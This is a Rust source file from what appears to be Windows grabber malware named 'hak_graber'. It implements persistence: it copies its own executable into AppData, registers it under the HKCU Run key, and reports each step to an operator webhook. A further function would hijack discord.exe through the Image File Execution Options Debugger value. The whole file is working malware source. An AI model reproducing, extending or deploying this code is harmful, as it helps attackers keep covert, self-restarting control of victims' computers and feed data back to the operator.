use crate::network;
use dirs;
use is_elevated::is_elevated;
use std::path::PathBuf;
use winreg::enums::*;
use winreg::RegKey;

pub fn execute_extra_persistence() {
    if !is_elevated() {
        return; //not administrator, so we can't do extra persistence
    }

    let temp_dir_path = copy_to_temp_dir();
    if temp_dir_path == None {
        return; //probably already did persistence stuff
    }

    let temp_dir_path = temp_dir_path.unwrap();
    _add_to_startup(&temp_dir_path);
    //ifeo_discord(&temp_dir_path); problem with this is it blocks discord completely
}

fn copy_to_temp_dir() -> Option<PathBuf> {
    //copy local exe to %appdata%, %temp%, etc
    //maybe return the paths it has been copied to
    let local_path = std::env::current_exe().expect("unable to get local directory");
    let foreign_path = dirs::data_dir().unwrap().join("hak_graber.exe");
    if local_path == foreign_path {
        return None;
    }
    let _result = std::fs::copy(local_path, &foreign_path).expect("failed to copy exe.");

    Some(foreign_path)
}

fn _add_to_startup(path: &PathBuf) {
    //add to windows->run and windows->runonce
    let run_key = RegKey::predef(HKEY_CURRENT_USER)
        .open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
        .expect("failed to access Run key");

    let sv_result = run_key.set_value("hakgraber", &path.display().to_string());
    if let Err(why) = sv_result {
        //this part is failing for some reason
        //println!("sv result error: ");
        //println!("{}", why);
        return;
    }

    network::send_webhook_message("installed basic persistence");
}

fn ifeo_discord(path: &PathBuf) {
    let ifeo_key = RegKey::predef(HKEY_LOCAL_MACHINE)
        .open_subkey(
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
        )
        .expect("failed to access ifeo");
    let (key, disp) = ifeo_key
        .create_subkey("discord.exe")
        .expect("unable to create regkey");

    if disp == REG_OPENED_EXISTING_KEY {
        return; //already applied IFEO
    }

    let ifeo_result = key.set_value("Debugger", &path.display().to_string());
    if ifeo_result.is_err() {
        return;
        //error occured when setting reg key
    }

    network::send_webhook_message("installed debugger persistence");
}
